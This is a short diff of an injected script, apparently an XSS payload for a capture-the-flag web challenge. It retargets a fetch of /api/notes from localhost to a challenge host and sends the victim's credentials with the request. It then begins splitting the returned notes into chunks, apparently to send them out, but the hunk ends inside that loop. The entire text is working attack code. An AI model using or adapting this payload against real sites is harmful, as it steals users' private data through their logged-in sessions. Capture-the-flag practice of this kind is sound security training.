@@ -1,7 +1,7 @@
 <script>
 (async ()=>{
   try{
-    const r = await fetch('http://localhost:8000/api/notes', { credentials: 'include' });
+    const r = await fetch('https://inst-f1d2c3160fbbf924-love-notes.chal.crewc.tf/api/notes', { credentials: 'include' });
     const text = await r.text();
     const max = 1800; // safe chunk size
     for (let i = 0; i < text.length; i += max) {
